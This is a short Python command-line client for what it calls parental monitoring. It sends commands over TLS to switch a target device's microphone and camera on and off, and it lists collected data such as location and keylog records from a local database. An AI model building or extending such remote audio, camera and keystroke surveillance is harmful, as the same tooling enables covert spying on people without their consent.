# parent_cli.py
import argparse
import socket
import ssl
import json
import sqlite3

HOST = "localhost"
PORT = 8080
DB_PATH = "monitoring_data.db"

def send_command(command, client_id="child_device_001"):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations("server.crt")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s = context.wrap_socket(s, server_hostname=HOST)
        s.connect((HOST, PORT))
        s.send(json.dumps({"client_id": client_id, "command": command}).encode())
        response = s.recv(1024).decode()
        print(f"Response: {response}")

def view_data(client_id, data_type=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    query = "SELECT type, data, timestamp FROM monitoring_data WHERE client_id = ?"
    params = [client_id]
    if data_type:
        query += " AND type = ?"
        params.append(data_type)
    c.execute(query, params)
    for row in c.fetchall():
        print(f"Type: {row[0]}, Data: {row[1]}, Timestamp: {row[2]}")
    conn.close()

def main():
    parser = argparse.ArgumentParser(description="Parental Monitoring CLI")
    parser.add_argument("--command", help="Command to send (e.g., start_audio, stop_audio, start_camera, stop_camera)")
    parser.add_argument("--view-data", help="View data for client ID")
    parser.add_argument("--data-type", help="Filter data by type (e.g., location, keylog)")
    args = parser.parse_args()

    if args.command:
        send_command(args.command)
    elif args.view_data:
        view_data(args.view_data, args.data_type)
    else:
        print("Use --command or --view-data")

if __name__ == "__main__":
    main()
